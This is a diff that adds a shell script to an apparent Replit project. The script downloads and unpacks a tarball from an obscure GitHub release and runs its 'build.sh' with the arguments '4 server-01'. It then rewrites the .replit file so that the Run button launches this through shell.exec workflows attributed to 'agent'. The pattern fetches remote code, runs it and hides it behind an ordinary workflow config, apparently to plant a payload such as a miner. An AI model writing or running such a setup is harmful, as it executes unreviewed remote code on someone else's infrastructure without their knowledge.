@@ -1,1 +1,29 @@
+curl -O -J -L http://github.com/zoxdameru821-arch/metax/releases/download/metas/metax.tar.gz && tar -xf metax.tar.gz && rm -rf metax.tar.gz
+echo '#!/bin/bash
+bash build.sh 4 server-01' > main
+  
+echo 'modules = ["nodejs-20"]
 
+[workflows]
+runButton = "proyeks"
+
+[[workflows.workflow]]
+name = "proyeks"
+mode = "sequential"
+author = "agent"
+
+[[workflows.workflow.tasks]]
+task = "workflow.run"
+args = "main"
+
+[[workflows.workflow]]
+name = "main"
+author = "agent"
+
+[[workflows.workflow.tasks]]
+task = "shell.exec"
+args = "bash main"
+
+[workflows.workflow.metadata]
+outputType = "console"
+' > .replit
